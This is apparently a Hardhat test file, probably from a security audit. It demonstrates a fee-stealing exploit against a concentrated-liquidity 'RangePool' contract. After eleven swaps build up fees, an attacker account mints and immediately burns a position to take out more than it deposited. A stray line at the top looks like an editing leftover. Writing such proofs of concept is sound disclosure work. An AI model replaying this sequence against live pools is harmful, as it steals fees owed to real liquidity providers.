/* global describe it before ethers */
const hardhat = require('hardhat')
const { expect } = require('chai')
import { gBefore } from '../utils/hooks.test'
import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers'
import { BigNumber } from 'ethers'
import { mintSigners20 } from '../utils/token'
import {
    validateMint,
    BN_ZERO,
    validateSwap,
    validateBurn,
    getTickAtPrice,
    getRangeBalanceOf,
    getSnapshot,
    getTickFeeGrowth,
    getFeeGrowthGlobal,
    getRangeFeeGrowth,
    getPositionFeeGrowth,
    getPrice,
} from '../utils/contracts/rangepool'
import { RangePoolState } from '../utils/contracts/limitpool'

alice: SignerWithAddress
describe('RangePool Exact In Tests', function () {
    let tokenAmount: BigNumber
    let token0Decimals: number
    let token1Decimals: number
    let minPrice: BigNumber
    let maxPrice: BigNumber

    let alice: SignerWithAddress
    let bob: SignerWithAddress
    let carol: SignerWithAddress

    ////////// DEBUG FLAGS //////////
    let debugMode           = false
    let balanceCheck        = false

    const liquidityAmount = BigNumber.from('28537150579967283223147')
    const liquidityAmount2 = BigNumber.from('50102591670431696268925')
    const liquidityAmount3 = BigNumber.from('3852877204305891777654')
    const minTickIdx = BigNumber.from('-887272')
    const maxTickIdx = BigNumber.from('887272')

    before(async function () {
        await gBefore()
        let currentBlock = await ethers.provider.getBlockNumber()
        const pool: RangePoolState = (await hre.props.limitPool.globalState()).pool
        const liquidity = pool.liquidity
        const feeGrowthGlobal0 = pool.feeGrowthGlobal0
        const feeGrowthGlobal1 = pool.feeGrowthGlobal1
        const price = pool.price
        const nearestTick = pool.tickAtPrice

        expect(liquidity).to.be.equal(BN_ZERO)

        minPrice = BigNumber.from('4295128739')
        maxPrice = BigNumber.from('1461446703485210103287273052203988822378723970341')
        token0Decimals = await hre.props.token0.decimals()
        token1Decimals = await hre.props.token1.decimals()
        tokenAmount = ethers.utils.parseUnits('100', token0Decimals)
        tokenAmount = ethers.utils.parseUnits('100', token1Decimals)
        alice = hre.props.alice
        bob = hre.props.bob
        carol = hre.props.carol
    })

    this.beforeEach(async function () {
        await mintSigners20(hre.props.token0, tokenAmount.mul(10), [hre.props.alice, hre.props.bob])
        await mintSigners20(hre.props.token1, tokenAmount.mul(10), [hre.props.alice, hre.props.bob])
    })


    it.only('Steal Fees From existing Liquidity Providers ', async function () {

        await validateMint({ // Regualr user mints position
            signer: hre.props.alice,
            recipient: hre.props.alice.address,
            lower: '-800000',
            upper: '800000',
            amount0: tokenAmount,
            amount1: tokenAmount,
            balance0Decrease: BigNumber.from('19999999999999999848'),
            balance1Decrease: BigNumber.from('100000000000000000000'),
            liquidityIncrease: BigNumber.from('44721359549995794013'),
            revertMessage: '',
        })

        await validateSwap({ // Next 11 swaps are just to increase the total fees
            signer: hre.props.alice,
            recipient: hre.props.alice.address,
            zeroForOne: true,
            amount: tokenAmount.div(2),
            sqrtPriceLimitX96: BigNumber.from('79450223072165328185028130650'),
            balanceInDecrease: BigNumber.from('24596364934905253800'),
            balanceOutIncrease: BigNumber.from('55125718852470931154'),
            revertMessage: '',
        })

        await validateSwap({
            signer: hre.props.alice,
            recipient: hre.props.alice.address,
            zeroForOne: false,
            amount: tokenAmount.div(2),
            sqrtPriceLimitX96: BigNumber.from('79450223072165328185028130650000'),
            balanceInDecrease: BigNumber.from('50000000000000000000'),
            balanceOutIncrease: BigNumber.from('23497952294453035875'),
            revertMessage: '',
        })
        console.log("COMPLETED SWAP 1");
        await validateSwap({
            signer: hre.props.alice,
            recipient: hre.props.alice.address,
            zeroForOne: true,
            amount: tokenAmount.div(2),
            sqrtPriceLimitX96: BigNumber.from('79450223072165328185028130650'),
            balanceInDecrease: BigNumber.from('23509707148027049401'),
            balanceOutIncrease: BigNumber.from('49974999999999999999'),
            revertMessage: '',
        })
        console.log("COMPLETED SWAP 2");
        await validateSwap({
            signer: hre.props.alice,
            recipient: hre.props.alice.address,
            zeroForOne: false,
            amount: tokenAmount.div(2),
            sqrtPriceLimitX96: BigNumber.from('79450223072165328185028130650000'),
            balanceInDecrease: BigNumber.from('50000000000000000000'),
            balanceOutIncrease: BigNumber.from('23497952294453035875'),
            revertMessage: '',
        })
        console.log("COMPLETED SWAP 3");
        await validateSwap({
            signer: hre.props.alice,
            recipient: hre.props.alice.address,
            zeroForOne: true,
            amount: tokenAmount.div(2),
            sqrtPriceLimitX96: BigNumber.from('79450223072165328185028130650'),
            balanceInDecrease: BigNumber.from('23509707148027049401'),
            balanceOutIncrease: BigNumber.from('49974999999999999999'),
            revertMessage: '',
        })


        console.log("COMPLETED SWAP 4");

        await validateSwap({
            signer: hre.props.alice,
            recipient: hre.props.alice.address,
            zeroForOne: false,
            amount: tokenAmount.div(2),
            sqrtPriceLimitX96: BigNumber.from('79450223072165328185028130650000'),
            balanceInDecrease: BigNumber.from('50000000000000000000'),
            balanceOutIncrease: BigNumber.from('23497952294453035875'),
            revertMessage: '',
        })
        console.log("COMPLETED SWAP 5");
        await validateSwap({
            signer: hre.props.alice,
            recipient: hre.props.alice.address,
            zeroForOne: true,
            amount: tokenAmount.div(2),
            sqrtPriceLimitX96: BigNumber.from('79450223072165328185028130650'),
            balanceInDecrease: BigNumber.from('23509707148027049401'),
            balanceOutIncrease: BigNumber.from('49974999999999999999'),
            revertMessage: '',
        })


        console.log("COMPLETED SWAP 6");


        await validateSwap({
            signer: hre.props.alice,
            recipient: hre.props.alice.address,
            zeroForOne: false,
            amount: tokenAmount.div(2),
            sqrtPriceLimitX96: BigNumber.from('79450223072165328185028130650000'),
            balanceInDecrease: BigNumber.from('50000000000000000000'),
            balanceOutIncrease: BigNumber.from('23497952294453035875'),
            revertMessage: '',
        })
        console.log("COMPLETED SWAP 7");
        await validateSwap({
            signer: hre.props.alice,
            recipient: hre.props.alice.address,
            zeroForOne: true,
            amount: tokenAmount.div(2),
            sqrtPriceLimitX96: BigNumber.from('79450223072165328185028130650'),
            balanceInDecrease: BigNumber.from('23509707148027049401'),
            balanceOutIncrease: BigNumber.from('49974999999999999999'),
            revertMessage: '',
        })


        console.log("COMPLETED SWAP 8");


        await validateSwap({
            signer: hre.props.alice,
            recipient: hre.props.alice.address,
            zeroForOne: false,
            amount: tokenAmount.div(2),
            sqrtPriceLimitX96: BigNumber.from('79450223072165328185028130650000'),
            balanceInDecrease: BigNumber.from('50000000000000000000'),
            balanceOutIncrease: BigNumber.from('23497952294453035875'),
            revertMessage: '',
        })
        console.log("COMPLETED SWAP 9");
        await validateSwap({
            signer: hre.props.alice,
            recipient: hre.props.alice.address,
            zeroForOne: true,
            amount: tokenAmount.div(2),
            sqrtPriceLimitX96: BigNumber.from('79450223072165328185028130650'),
            balanceInDecrease: BigNumber.from('23509707148027049401'),
            balanceOutIncrease: BigNumber.from('49974999999999999999'),
            revertMessage: '',
        })


        console.log("COMPLETED SWAP 10");

        await validateSwap({
            signer: hre.props.alice,
            recipient: hre.props.alice.address,
            zeroForOne: true,
            amount: tokenAmount.div(2),
            sqrtPriceLimitX96: BigNumber.from('7945022307216532818502813065'),
            balanceInDecrease: BigNumber.from('50000000000000000000'),
            balanceOutIncrease: BigNumber.from('23692390917121430875'),
            revertMessage: '',
        })

        console.log("COMPLETED SWAP 11");

        await validateMint({ // Attacker mints position 
            signer: hre.props.bob,
            recipient: hre.props.bob.address,
            lower: '-800000',
            upper: '800000',
            amount0: tokenAmount,
            amount1: tokenAmount,
            balance0Decrease: BigNumber.from('100000000000000000000'),
            balance1Decrease: BigNumber.from('22350183831785716657'),
            liquidityIncrease: BigNumber.from('47275981038774559631'),
            revertMessage: '',
        })

        await validateBurn({ // Attacker burns and get out more then they put in ~0.077 eth  with 11 swaps
            signer: hre.props.bob,
            lower: '-800000',
            upper: '800000',
            liquidityAmount: BigNumber.from('47275981038774559630'),
            balance0Increase: BigNumber.from('99999999999999999997'),
            balance1Increase: BigNumber.from('22427907242004586202'),
            revertMessage: '',
        })

        console.log("COMPLETED BURN");
    })

})